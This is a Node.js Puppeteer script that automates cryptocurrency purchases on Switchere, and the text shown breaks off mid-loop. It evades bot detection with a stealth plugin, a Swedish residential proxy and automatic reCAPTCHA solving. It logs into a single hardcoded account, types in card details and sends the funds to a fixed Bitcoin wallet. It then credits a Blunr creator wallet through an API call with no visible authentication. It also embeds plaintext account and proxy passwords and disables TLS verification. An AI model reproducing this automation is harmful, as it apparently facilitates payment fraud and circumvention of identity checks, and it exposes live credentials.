const readline = require("readline");
const path = require("path");
const puppeteerExtra = require("puppeteer-extra");
const Stealth = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const https = require("https");
puppeteerExtra.use(Stealth());
const fs = require("fs");
// const UserAgent = require("user-agents");

// Import simple payment check function
const { checkPaymentStatus } = require("./simple-payment-check.js");

// Load Bright Data SSL certificate
const brightDataCert = fs.readFileSync(
  path.join(__dirname, "BrightData SSL certificate (port 33335).crt"),
);

// Create HTTPS agent with custom certificate
const httpsAgent = new https.Agent({
  ca: brightDataCert,
  rejectUnauthorized: false, // Set to true in production for better security
});

// Test Bright Data proxy connection
async function testBrightDataConnection() {
  try {
    console.log("Testing Bright Data proxy connection with SSL certificate...");

    const testResponse = await axios.get(
      "https://geo.brdtest.com/welcome.txt",
      {
        proxy: {
          protocol: "http",
          host: "brd.superproxy.io",
          port: 33335,
          auth: {
            username: "brd-customer-hl_db0d15f7-zone-web_unlocker1",
            password: "vj3959aai5pp",
          },
        },
        httpsAgent: httpsAgent,
        timeout: 10000,
      },
    );

    console.log("✅ Bright Data connection successful!");
    console.log("Response:", testResponse.data.substring(0, 100) + "...");
    return true;
  } catch (error) {
    console.log("❌ Bright Data connection failed:", error.message);
    return false;
  }
}

// After successful login, save cookies
async function saveCookies(page, filePath) {
  const cookies = await page.cookies();
  fs.writeFileSync(filePath, JSON.stringify(cookies, null, 2));
  console.log(`Cookies saved to ${filePath}`);
}

// Load cookies from file
async function loadCookies(page, filePath) {
  if (fs.existsSync(filePath)) {
    const cookies = JSON.parse(fs.readFileSync(filePath));
    await page.setCookie(...cookies);
    console.log(`Cookies loaded from ${filePath}`);
    return true;
  }
  return false;
}
// Use the correct Blunr API URL (not the checkout subdomain)
// Try the main API domain instead of checkout subdomain
// const blunrURL = "https://api.blunr.com/api/wallet/credit-user";
// Alternative URLs to try:
// const blunrURL = "https://blunr.com/api/wallet/credit-user";
const blunrURL = "https://backend.blunr.com/api/wallet/credit-user";
function askQuestion(query) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  return new Promise((resolve) =>
    rl.question(query, (ans) => {
      rl.close();
      resolve(ans);
    }),
  );
}

async function createExternalTransaction(blunrParams, amount) {
  try {
    if (!blunrParams.recipientId) {
      throw new Error("No recipient ID provided for transaction creation");
    }

    console.log("Creating external payment transaction...");

    const transactionURL =
      "https://backend.blunr.com/api/transaction/create-external";
    const requestData = {
      amount: parseFloat(amount),
      recipientId: blunrParams.recipientId,
      paymentProvider: "switchere",
      currency: "USD",
    };

    console.log(
      "Transaction request data:",
      JSON.stringify(requestData, null, 2),
    );

    const response = await axios.post(transactionURL, requestData, {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      timeout: 10000,
      httpsAgent: httpsAgent,
      proxy: false,
      maxRedirects: 0,
      validateStatus: function (status) {
        return true; // Accept any status code to see what's happening
      },
    });

    console.log("Transaction creation response status:", response.status);

    if (response.status === 201 && response.data.success) {
      console.log(
        "✅ Transaction created successfully:",
        response.data.transactionId,
      );
      return response.data.transactionId;
    } else {
      console.error("❌ Failed to create transaction:", response.data);
      throw new Error(
        `Transaction creation failed: ${response.data.message || "Unknown error"}`,
      );
    }
  } catch (error) {
    console.error("❌ Error creating external transaction:", error.message);
    if (error.response) {
      console.error("Response data:", error.response.data);
      console.error("Response status:", error.response.status);
    }
    throw error;
  }
}

async function addFundsToCreatorWallet(blunrParams, amount, transactionId) {
  try {
    if (!blunrParams.recipientId) {
      console.log("No recipient ID provided, skipping wallet update");
      return;
    }

    if (!transactionId) {
      console.log("No transaction ID provided, skipping wallet update");
      return;
    }

    console.log(
      `Adding ${amount} to creator wallet for recipient: ${blunrParams.recipientId}`,
    );
    console.log(`Making request to: ${blunrURL}`);

    // Log the full request details for debugging
    const requestData = {
      amount: parseFloat(amount),
      recipientId: blunrParams.recipientId,
      transactionId: transactionId,
    };
    console.log("Request data:", JSON.stringify(requestData, null, 2));

    // First, let's check if we can reach the API
    console.log("Testing connection to Blunr API...");

    const response = await axios.post(blunrURL, requestData, {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      timeout: 10000,
      // Use the HTTPS agent with Bright Data certificate
      httpsAgent: httpsAgent,
      // Explicitly disable proxy for this request
      proxy: false,
      // Don't follow redirects automatically
      maxRedirects: 0,
      validateStatus: function (status) {
        return true; // Accept any status code to see what's happening
      },
    });

    console.log("Response status:", response.status);
    console.log("Response headers:", response.headers);

    if (response.status === 301 || response.status === 302) {
      console.log("Redirect detected. Location:", response.headers.location);
    }

    if (response.status === 404) {
      console.error("❌ Creator wallet API endpoint not found (404)");
      console.error("Please check if the API endpoint is correct:", blunrURL);

      // Check if we're getting a localhost response
      if (
        typeof response.data === "string" &&
        response.data.includes("localhost:3000")
      ) {
        console.error(
          "⚠️  WARNING: Request seems to be going to localhost instead of Blunr API!",
        );
        console.error(
          "This might be due to proxy configuration or DNS issues.",
        );
      }
    } else if (response.data.success || response.status === 200) {
      console.log("✅ Creator wallet updated successfully:", response.data);
    } else {
      console.error("❌ Failed to update creator wallet:", response.data);
      console.error("Status code:", response.status);
    }
  } catch (error) {
    console.error("❌ Error adding funds to creator wallet:", error.message);
    if (error.response) {
      console.error("Response data:", error.response.data);
      console.error("Response status:", error.response.status);
    }
  }
}

async function waitForPaybisIframe(page, retries = 20, delay = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const iframeHandle = await page.waitForSelector(
        'iframe[src*="cp.paybis.com"]',
        { visible: true, timeout: 20000 },
      );
      if (iframeHandle) {
        console.log(`Paybis iframe found on attempt ${i + 1}`);
        return iframeHandle;
      }
    } catch (error) {
      console.log(`Paybis iframe not found. Retry ${i + 1}/${retries}...`);
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }
  throw new Error("Paybis iframe did not appear after multiple retries.");
}

// Track CAPTCHA attempts to prevent infinite loops
let captchaAttempts = 0;
const MAX_CAPTCHA_ATTEMPTS = 5;

async function solveCaptchaIfNeeded(page) {
  try {
    // Check if page is still valid
    if (!page || page.isClosed()) {
      return;
    }

    // Prevent infinite CAPTCHA solving loops
    if (captchaAttempts >= MAX_CAPTCHA_ATTEMPTS) {
      console.log("Max CAPTCHA attempts reached, skipping further attempts");
      return;
    }

    // Check for multiple CAPTCHA selectors
    const captchaSelectors = [
      'iframe[title="recaptcha challenge expires in two minutes"]',
      'iframe[src*="recaptcha"]',
      ".g-recaptcha",
      "#recaptcha",
      'iframe[name="c-recaptcha"]',
    ];

    let captchaFrame = null;
    let foundCaptcha = false;

    for (const selector of captchaSelectors) {
      try {
        const iframe = await page.waitForSelector(selector, {
          visible: true,
          timeout: 1000,
        });
        if (iframe) {
          captchaFrame = await iframe.contentFrame();
          if (captchaFrame) {
            foundCaptcha = true;
            console.log(`CAPTCHA found with selector: ${selector}`);
            break;
          }
        }
      } catch (e) {
        // Try next selector
      }
    }

    if (!foundCaptcha) {
      return;
    }

    // Check if frame is still valid before using it
    try {
      await captchaFrame.evaluate(() => document.readyState);
    } catch (frameError) {
      return;
    }

    // Try multiple solver button selectors
    const solverSelectors = [
      "div.button-holder.help-button-holder",
      ".solver-button",
      "[id*=solver]",
      ".buster-button",
    ];

    let solverClicked = false;
    for (const selector of solverSelectors) {
      try {
        const helpButton = await captchaFrame.waitForSelector(selector, {
          timeout: 2000,
        });
        if (helpButton) {
          captchaAttempts++; // Increment attempt counter
          console.log(
            `CAPTCHA solver found with selector: ${selector}, attempting to solve... (attempt ${captchaAttempts}/${MAX_CAPTCHA_ATTEMPTS})`,
          );
          await helpButton.click();
          console.log("CAPTCHA solver clicked, waiting for resolution...");

          // Wait and check if CAPTCHA was actually solved
          let captchaSolved = false;
          for (let attempt = 0; attempt < 6; attempt++) {
            await new Promise((resolve) => setTimeout(resolve, 2000));

            // Check if CAPTCHA iframe still exists
            try {
              const stillExists = await page.$(
                'iframe[title="recaptcha challenge expires in two minutes"]',
              );
              if (!stillExists) {
                captchaSolved = true;
                console.log("CAPTCHA appears to be solved!");
                break;
              }
            } catch (e) {
              // CAPTCHA might be solved
              captchaSolved = true;
              break;
            }

            console.log(
              `CAPTCHA still present, waiting... (attempt ${attempt + 1}/6)`,
            );
          }

          if (!captchaSolved) {
            console.log("CAPTCHA solver may have failed, but continuing...");
          }

          solverClicked = true;
          break;
        }
      } catch (e) {
        // Try next selector
      }
    }

    if (!solverClicked) {
      console.log("CAPTCHA detected but no solver button found");
    }
  } catch (error) {
    // Silently handle common frame detachment errors
    if (
      error.message.includes("detached") ||
      error.message.includes("Target closed")
    ) {
      return;
    }
    // Don't log CAPTCHA check failures to reduce noise
  }
}

async function main() {
  const amount = process.env.AMOUNT || 200;
  const gmail = "m4teelias@gmail.com";
  const password = "Diana110604";
  const walletAddress = "bc1q23h9eysa08359yj2cy2chf4af7xvmc5c8qjk8y";
  const cardNumber = process.env.CARD_NUMBER;
  const expiryDate = process.env.EXPIRY_DATE;
  const cvv = process.env.CVV;
  const street = process.env.STREET;
  const city = process.env.CITY;
  const zip = process.env.ZIP;
  const name = process.env.NAME;

  // Parse Blunr parameters
  const blunrParams = JSON.parse(process.env.BLUNR_PARAMS || "{}");

  const extensionPath = path.join(process.cwd(), "buster-extension");

  // Proxy configuration
  const proxyServer = "gate.nodemaven.com:8080";
  const proxyUsername =
    "mohammedistanbul123_gmail_com-country-se-region-stockholm_county-sid-4fc068db62dc4-filter-medium";
  const proxyPassword = "2xmllgs8ht";
  const browser = await puppeteerExtra.launch({
    headless: "new",
    args: [
      `--disable-extensions-except=${extensionPath}`,
      `--load-extension=${extensionPath}`,
      "--no-sandbox",
      `--proxy-server=${proxyServer}`,
      `--proxy-bypass-list=<-loopback>`, // Bypass proxy for local requests
      "--ignore-certificate-errors-spki-list",
      "--ignore-certificate-errors",
      "--ignore-ssl-errors",
      `--ssl-client-certificate-file=${path.join(__dirname, "BrightData SSL certificate (port 33335).crt")}`,
    ],
  });
  /* const browser = await puppeteer.connect({
    browserWSEndpoint:
      "wss://mohammedistanbul123_gmail_com-country-any-sid-ee682069a1144:2xmllgs8ht@browser.nodemaven.com",
  }); */
  const page = await browser.newPage();

  const randomUserAgent =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

  await page.setUserAgent(randomUserAgent);

  // Using simplified payment detection - no complex network monitoring needed
  console.log("🎯 Using simplified payment detection approach");

  page.on("requestfailed", (request) => {
    console.error(`❌ REQUEST FAILED: ${request.method()} ${request.url()}`);
    console.error(`💥 Failure reason: ${request.failure()?.errorText}`);
  });

  page.on("console", (msg) => {
    console.log(`🖥️ BROWSER CONSOLE [${msg.type()}]: ${msg.text()}`);
  });

  page.on("pageerror", (error) => {
    console.error(`💥 PAGE ERROR: ${error.message}`);
  });

  await page.authenticate({
    username: proxyUsername,
    password: proxyPassword,
  });

  await loadCookies(page, path.join(__dirname, "cookies.json"));

  console.log(`Using proxy: ${proxyServer} with username: ${proxyUsername}`);

  // Test proxy by checking IP

  let captchaInterval;
  let transactionId = null;

  try {
    // Create transaction record before starting payment
    console.log("Creating transaction record before payment...");
    transactionId = await createExternalTransaction(blunrParams, amount);
    console.log(`Transaction created with ID: ${transactionId}`);

    // Start CAPTCHA checking immediately and run throughout the entire process
    console.log("Starting CAPTCHA monitoring (checking every 3 seconds)...");
    captchaInterval = setInterval(() => solveCaptchaIfNeeded(page), 3000);

    console.log("🌐 === NAVIGATING TO SWITCHERE ===");
    console.log("📍 Target URL: https://switchere.com/onramp#/");

    const navigationStart = Date.now();
    console.log(
      "🚀 Starting navigation with domcontentloaded wait condition...",
    );

    try {
      await page.goto("https://switchere.com/onramp#/", {
        waitUntil: "networkidle0",
        timeout: 10000,
      });
      console.log("✅ Page navigation successful");
    } catch (error) {
      console.log("⚠️ Navigation error:", error.message);
      console.log("🔄 Attempting to continue anyway...");
    }

    const navigationTime = Date.now() - navigationStart;
    console.log(`⏱️ Navigation completed in ${navigationTime}ms`);
    console.log(`📍 Final URL: ${page.url()}`);
    console.log(`📄 Page title: ${await page.title()}`);

    // Take initial screenshot
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "01-initial-page-load.png"),
      fullPage: true,
    });
    console.log("📸 Initial page screenshot taken");

    // Try to load existing cookies

    // CAPTCHA checking already started at the beginning

    console.log(`Entering ${amount}...`);

    try {
      // Wait for page to fully load
      await new Promise((resolve) => setTimeout(resolve, 5000)); // Give the page time to load

      // Additional wait for dynamic content
      await page
        .waitForFunction(() => document.readyState === "complete", {
          timeout: 10000,
        })
        .catch(() => {
          console.log("Document ready timeout, continuing anyway...");
        });

      // Take a debug screenshot
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "debug-before-amount.png"),
        fullPage: true,
      });

      // Try multiple selectors
      const selectors = [
        ".sw-payment-amount-input",
        "input.sw-payment-amount-input",
        'input[placeholder="0.00"]',
        'input[type="text"][inputmode="decimal"]',
        ".sw-payment-input-group__amount-input",
      ];

      let amountInput = null;
      let foundSelector = null;

      for (const selector of selectors) {
        try {
          console.log(`Trying selector: ${selector}`);
          const element = await page.$(selector);
          if (element) {
            amountInput = element;
            foundSelector = selector;
            console.log(`Found input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Selector ${selector} failed:`, e.message);
        }
      }

      // If still not found, try with evaluate
      if (!amountInput) {
        console.log("Trying with page.evaluate...");

        // First, let's see what inputs are on the page
        const inputInfo = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          return {
            count: inputs.length,
            inputs: inputs.map((input) => ({
              type: input.type,
              placeholder: input.placeholder,
              value: input.value,
              className: input.className,
              id: input.id,
              name: input.name,
            })),
          };
        });

        console.log(
          "Found inputs on page:",
          JSON.stringify(inputInfo, null, 2),
        );

        // Try to find the input
        const foundInput = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          const targetInput = inputs.find(
            (input) =>
              input.placeholder === "0.00" ||
              input.classList.contains("sw-payment-amount-input") ||
              input.value === "100" ||
              input.type === "text",
          );
          return targetInput ? true : false;
        });

        if (foundInput) {
          // Use page.evaluate to interact with it directly
          await page.evaluate((amountValue) => {
            const inputs = Array.from(document.querySelectorAll("input"));
            const targetInput = inputs.find(
              (input) =>
                input.placeholder === "0.00" ||
                input.classList.contains("sw-payment-amount-input") ||
                input.value === "100" ||
                input.type === "text",
            );

            if (targetInput) {
              targetInput.focus();
              targetInput.value = "";
              targetInput.value = amountValue;
              targetInput.dispatchEvent(new Event("input", { bubbles: true }));
              targetInput.dispatchEvent(new Event("change", { bubbles: true }));
            }
          }, amount.toString());

          console.log("Amount entered successfully using page.evaluate.");
        } else {
          // Check if we're on the right page
          const pageTitle = await page.title();
          const currentUrl = page.url();
          console.log("Page title:", pageTitle);
          console.log("Current URL:", currentUrl);

          // Log visible text on the page
          const visibleText = await page.evaluate(() => {
            return document.body.innerText.substring(0, 500);
          });
          console.log("Visible text on page:", visibleText);

          throw new Error(
            "Could not find amount input field - page might not have loaded correctly",
          );
        }
      } else if (amountInput) {
        // Original method if we found it with selectors
        const elementExists = await amountInput
          .evaluate((el) => el !== null)
          .catch(() => false);

        if (elementExists) {
          await amountInput.click({ clickCount: 3 });
          await new Promise((resolve) => setTimeout(resolve, 500));
          await page.keyboard.type(amount.toString(), { delay: 100 });
          console.log("Amount entered successfully.");
        } else {
          throw new Error("Found element handle but element is null");
        }
      }
    } catch (error) {
      console.error("Error entering amount:", error);
      throw error;
    }

    console.log("Waiting for 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("Clicking the first 'Buy' button...");
    const buyButtonHandle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      return buttons.find((button) => button.textContent.includes("Buy"));
    });
    if (buyButtonHandle.asElement()) {
      await buyButtonHandle.asElement().click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await buyButtonHandle.asElement().click();
      await buyButtonHandle.asElement().click();
    } else {
      throw new Error('Could not find "Buy" button');
    }
    console.log("First 'Buy' button clicked. Proceeding to login.");

    // Brief wait for page to respond after buy button click
    await new Promise((resolve) => setTimeout(resolve, 500));

    // Check if email input is visible (if not, we're already logged in)
    const emailSelectors = [
      "#email-input",
      'input[name="email"]',
      'input[type="email"]',
      '.sw-input__input[type="email"]',
    ];

    let emailInputVisible = false;
    for (const selector of emailSelectors) {
      try {
        await page.waitForSelector(selector, { visible: true, timeout: 500 });
        emailInputVisible = true;
        console.log(
          `Email input found with selector: ${selector} - proceeding with login`,
        );
        break;
      } catch (e) {
        // Email input not found with this selector
      }
    }

    if (!emailInputVisible) {
      console.log(
        "No email input visible - appears to be already logged in. Skipping login process.",
      );
    } else {
      console.log("Entering email...");

      let emailInput = null;
      for (const selector of emailSelectors) {
        try {
          console.log(`Trying email selector: ${selector}`);
          await page.waitForSelector(selector, {
            visible: true,
            timeout: 10000,
          });
          emailInput = await page.$(selector);
          if (emailInput) {
            console.log(`Found email input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Email selector ${selector} failed:`, e.message);
        }
      }

      if (!emailInput) {
        await page.screenshot({
          path: path.join(__dirname, "screenshots", "email-input-debug.png"),
          fullPage: true,
        });
        throw new Error("Could not find email input field");
      }

      await emailInput.click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await emailInput.type(gmail);

      console.log("Waiting 1 second...");
      await new Promise((resolve) => setTimeout(resolve, 1000));
      console.log("Clicking 'Complete' after email...");

      // Take screenshot before clicking complete
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "before-email-complete.png"),
        fullPage: true,
      });

      const completeButtonHandle = await page.evaluateHandle(() => {
        const buttons = Array.from(
          document.querySelectorAll('button[data-testid="submit"]'),
        );
        return buttons.find((button) =>
          button.textContent.includes("Complete"),
        );
      });
      if (completeButtonHandle.asElement()) {
        await completeButtonHandle.asElement().click();
        console.log("Email complete button clicked successfully");

        // Wait a bit after clicking
        await new Promise((resolve) => setTimeout(resolve, 2000));
      } else {
        // Log available buttons for debugging
        const availableButtons = await page.evaluate(() => {
          const buttons = Array.from(document.querySelectorAll("button"));
          return buttons.map((btn) => ({
            text: btn.textContent?.trim(),
            testId: btn.getAttribute("data-testid"),
            disabled: btn.disabled,
          }));
        });
        console.log(
          "Available buttons:",
          JSON.stringify(availableButtons, null, 2),
        );
        throw new Error('Could not find "Complete" button after email');
      }

      console.log("Entering password...");

      // Try multiple selectors and longer timeout
      const passwordSelectors = [
        "#password-input",
        'input[name="password"]',
        'input[type="password"]',
        '.sw-input__input[type="password"]',
      ];

      let passwordInput = null;
      let foundPasswordSelector = null;

      for (const selector of passwordSelectors) {
        try {
          console.log(`Trying password selector: ${selector}`);
          await page.waitForSelector(selector, {
            visible: true,
            timeout: 10000,
          });
          passwordInput = await page.$(selector);
          if (passwordInput) {
            foundPasswordSelector = selector;
            console.log(`Found password input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Password selector ${selector} failed:`, e.message);
        }
      }

      if (!passwordInput) {
        // Take debug screenshot
        await page.screenshot({
          path: path.join(__dirname, "screenshots", "password-input-debug.png"),
          fullPage: true,
        });

        // Log all password-type inputs on the page
        const passwordInputs = await page.evaluate(() => {
          const inputs = Array.from(
            document.querySelectorAll(
              'input[type="password"], input[name="password"]',
            ),
          );
          return inputs.map((input) => ({
            id: input.id,
            name: input.name,
            className: input.className,
            placeholder: input.placeholder,
            visible: input.offsetParent !== null,
          }));
        });
        console.log(
          "Available password inputs:",
          JSON.stringify(passwordInputs, null, 2),
        );

        throw new Error("Could not find password input field");
      }

      await passwordInput.click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await passwordInput.type(password);

      console.log("Clicking 'Complete' after password to log in...");

      // Take screenshot before login
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "before-login.png"),
        fullPage: true,
      });

      const loginButtonHandle = await page.evaluateHandle(() => {
        const buttons = Array.from(
          document.querySelectorAll('button[data-testid="submit"]'),
        );
        return buttons.find((button) =>
          button.textContent.includes("Complete"),
        );
      });
      if (loginButtonHandle.asElement()) {
        await loginButtonHandle.asElement().click();
        console.log("Login button clicked successfully");

        // Wait for login to process
        await new Promise((resolve) => setTimeout(resolve, 3000));
      } else {
        // Log available buttons for debugging
        const availableButtons = await page.evaluate(() => {
          const buttons = Array.from(document.querySelectorAll("button"));
          return buttons.map((btn) => ({
            text: btn.textContent?.trim(),
            testId: btn.getAttribute("data-testid"),
            disabled: btn.disabled,
          }));
        });
        console.log(
          "Available login buttons:",
          JSON.stringify(availableButtons, null, 2),
        );
        throw new Error('Could not find "Complete" login button');
      }

      console.log("Login successful.");

      console.log("Taking screenshot '2.png' of the main page after login.");
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "2.png"),
      });
      console.log("Screenshot taken.");

      // Save cookies after successful login to refresh them
      await saveCookies(page, path.join(__dirname, "cookies.json"));
      console.log("Cookies saved after login.");
    }

    console.log("Entering wallet address...");
    await page.waitForSelector('input[name="wallet"]', { visible: true });
    const walletInput = await page.$('input[name="wallet"]');
    await walletInput.click();
    await new Promise((resolve) => setTimeout(resolve, 500));
    await walletInput.type(walletAddress);
    console.log("Wallet address entered.");

    console.log("Waiting for 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    console.log("Clicking the second 'Buy' button...");
    const buyButtons2Handle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const buyButtons = buttons.filter((button) =>
        button.textContent.includes("Buy"),
      );
      return buyButtons.length > 0 ? buyButtons[buyButtons.length - 1] : null;
    });
    if (buyButtons2Handle.asElement()) {
      await buyButtons2Handle.asElement().click();
    } else {
      throw new Error('Could not find second "Buy" button');
    }
    console.log("Second 'Buy' button clicked. Proceeding to purchase.");

    // (Previous code remains the same)

    console.log(
      "Waiting for the page to settle before looking for 'New card' button...",
    );
    await new Promise((resolve) => setTimeout(resolve, 5000)); // Shortened wait

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "before-new-card.png"),
    });

    console.log("Looking for 'New card' button or CAPTCHA...");
    let newCardClicked = false;
    for (let i = 0; i < 20; i++) {
      // Increased retries to 20 (total 1 minute)
      try {
        // First, check for the 'New card' button inside all frames
        for (const frame of page.frames()) {
          const newCardButton = await frame.$(
            ".card-select__new-card .new-card",
          );
          if (newCardButton) {
            console.log("Found 'New card' button, clicking it.");
            await newCardButton.click();
            newCardClicked = true;
            break;
          }
        }
        if (newCardClicked) break;

        // Wait before the next attempt (CAPTCHA is already being checked every 3 seconds)
        console.log(`Retrying... Attempt ${i + 1}/20`);
        await new Promise((resolve) => setTimeout(resolve, 3000));
      } catch (error) {
        console.error("Error within retry loop:", error.message);
        await new Promise((resolve) => setTimeout(resolve, 3000));
      }
    }

    if (!newCardClicked) {
      throw new Error(
        "'New card' button not found after multiple retries and CAPTCHA checks.",
      );
    }

    // (Rest of the code remains the same)
    console.log("Proceeding to wait for iframe to load...");

    await new Promise((resolve) => setTimeout(resolve, 5000));

    const iframeElementHandle = await page.waitForSelector("iframe", {
      visible: true,
      timeout: 30000,
    });
    console.log(
      "Found iframe:",
      await iframeElementHandle.evaluate((el) => el.src),
    );

    // Wait for outer iframe (you found this URL: https://widget.paybis.com/...)
    const outerIframeElement = await page.waitForSelector(
      'iframe[src*="widget.paybis.com"]',
      { timeout: 30000 },
    );
    const outerFrame = await outerIframeElement.contentFrame();

    if (!outerFrame) {
      throw new Error("Outer iframe contentFrame() returned null");
    }

    // Now inside outer iframe, wait for inner iframe (which should have src including "cp.paybis.com")
    const innerIframeElement = await outerFrame.waitForSelector(
      'iframe[src*="cp.paybis.com"]',
      { timeout: 30000 },
    );
    const innerFrame = await innerIframeElement.contentFrame();

    if (!innerFrame) {
      throw new Error("Inner iframe contentFrame() returned null");
    }

    // Now you can interact with innerFrame DOM, e.g.
    await innerFrame.waitForSelector('input[name="number"]', {
      timeout: 15000,
    });
    await innerFrame.waitForSelector('input[name="exp"]', { timeout: 15000 });
    await innerFrame.waitForSelector('input[name="cvv"]', { timeout: 15000 });

    // Example typing into a field inside the inner iframe
    await innerFrame.type('input[name="number"]', cardNumber, { delay: 100 });
    await innerFrame.type('input[name="exp"]', expiryDate, { delay: 100 });
    await innerFrame.type('input[name="cvv"]', cvv, { delay: 100 });

    // Wait a moment for validation to occur
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Check for field errors in the payment form
    const fieldErrors = await innerFrame.evaluate(() => {
      const errorElements = document.querySelectorAll(".field__error");
      const errors = [];
      errorElements.forEach((errorEl) => {
        const errorText = errorEl.textContent?.trim();
        if (errorText && errorText.length > 0) {
          errors.push(errorText);
        }
      });
      return errors;
    });

    if (fieldErrors.length > 0) {
      console.log("Field errors detected:", fieldErrors);

      // Send error back to frontend and cancel transaction
      process.send({
        type: "payment-error",
        fieldErrors: fieldErrors,
        error: "Payment form validation failed",
      });

      // Take screenshot for debugging
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "payment-form-errors.png"),
        fullPage: true,
      });

      // Exit cleanly so the server doesn't think this is a system error
      console.log("Exiting due to field validation errors");
      process.exit(0);
    }

    console.log("No field errors detected, proceeding with payment");

    await outerFrame.evaluate(() => {
      window.scrollBy(0, 500); // Scroll down 500 pixels vertically
    });

    await innerFrame.evaluate(
      async (street, city, zip, name) => {
        function delay(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        function simulateTyping(input, text) {
          input.focus();
          input.value = "";
          for (let i = 0; i < text.length; i++) {
            const char = text[i];
            input.value += char;
            input.dispatchEvent(
              new InputEvent("input", { bubbles: true, data: char }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keydown", { key: char, bubbles: true }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keyup", { key: char, bubbles: true }),
            );
          }
        }

        const dropdownInput = document.querySelector("input.select__search");
        if (dropdownInput) {
          dropdownInput.focus();
          dropdownInput.click();
          await delay(300); // give time for dropdown to open

          simulateTyping(dropdownInput, "Sweden");
          await delay(500); // wait for options to render

          const options = Array.from(
            document.querySelectorAll(".select__option"),
          );
          const swedenOption = options.find(
            (opt) => opt.textContent.trim() === "Sweden",
          );
          if (swedenOption) {
            swedenOption.click();
          } else {
            console.warn("Sweden option not found");
          }

          await delay(300); // wait for selection to propagate to internal model
        }

        function setInputValue(selector, value) {
          const input = document.querySelector(selector);
          if (!input) return false;
          input.focus();
          input.value = value;
          input.dispatchEvent(new Event("input", { bubbles: true }));
          input.dispatchEvent(new Event("change", { bubbles: true }));
          return true;
        }

        setInputValue("input#address", street);
        setInputValue("input#city", city);
        setInputValue("input#zip", zip);
        setInputValue('input[name="name"]', name);

        // Uncheck checkbox
        const checkbox = document.querySelector(
          'input.checkbox__input[type="checkbox"]',
        );
        if (checkbox && checkbox.checked) {
          checkbox.click();
          checkbox.dispatchEvent(new Event("input", { bubbles: true }));
          checkbox.dispatchEvent(new Event("change", { bubbles: true }));
        }
      },
      street,
      city,
      zip,
      name,
    );

    console.log("Waiting for 'Pay' button...");
    await outerFrame.waitForSelector('button[data-testid="pay-button"]', {
      visible: true,
      timeout: 15000,
    });

    console.log("💳 === INITIATING PAYMENT ===");
    console.log("🎯 Clicking 'Pay' button...");

    // Log button state before clicking
    const buttonState = await outerFrame.evaluate(() => {
      const button = document.querySelector('button[data-testid="pay-button"]');
      return button
        ? {
            disabled: button.disabled,
            innerText: button.innerText,
            className: button.className,
            style: button.style.cssText,
          }
        : null;
    });
    console.log("🔘 Pay button state:", JSON.stringify(buttonState, null, 2));

    await outerFrame.click('button[data-testid="pay-button"]');
    console.log("✅ 'Pay' button clicked successfully");

    // Take screenshot after clicking
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "payment-initiated.png"),
      fullPage: true,
    });
    console.log("📸 Payment initiation screenshot taken");

    console.log("⏳ === WAITING FOR PAYMENT PROCESSING ===");
    console.log(
      "🔄 Monitoring for 'Payment Processing' screen to disappear...",
    );

    await outerFrame.waitForFunction(
      () => {
        const elem = document.querySelector("h2");
        const processingVisible =
          elem && elem.innerText.includes("Payment Processing");

        if (processingVisible) {
          console.log("⏳ Payment still processing...");
        } else {
          console.log("✅ Payment processing screen has disappeared");
        }

        // Log all h2 elements for debugging
        const allH2s = Array.from(document.querySelectorAll("h2")).map(
          (h2) => h2.innerText,
        );
        console.log("📄 Current H2 elements:", allH2s);

        return !processingVisible;
      },
      { timeout: 90000, polling: 2000 },
    );

    console.log("🎉 'Payment Processing' screen has disappeared!");

    // Log current page state after processing
    const postProcessingState = await outerFrame.evaluate(() => {
      return {
        url: window.location.href,
        title: document.title,
        bodyText: document.body.innerText.substring(0, 500),
        allHeadings: {
          h1: Array.from(document.querySelectorAll("h1")).map(
            (h) => h.innerText,
          ),
          h2: Array.from(document.querySelectorAll("h2")).map(
            (h) => h.innerText,
          ),
          h3: Array.from(document.querySelectorAll("h3")).map(
            (h) => h.innerText,
          ),
        },
      };
    });
    console.log(
      "📊 Post-processing page state:",
      JSON.stringify(postProcessingState, null, 2),
    );

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "after-processing.png"),
    });
    console.log("Screenshot taken after processing screen.");

    let bankIdFrame = null;
    console.log("🔍 === STARTING BANKID FRAME SEARCH ===");
    console.log(`Current page URL: ${page.url()}`);
    console.log(`Total frames available: ${page.frames().length}`);

    // Log all available frames
    for (let frameIndex = 0; frameIndex < page.frames().length; frameIndex++) {
      const frame = page.frames()[frameIndex];
      try {
        const frameUrl = frame.url();
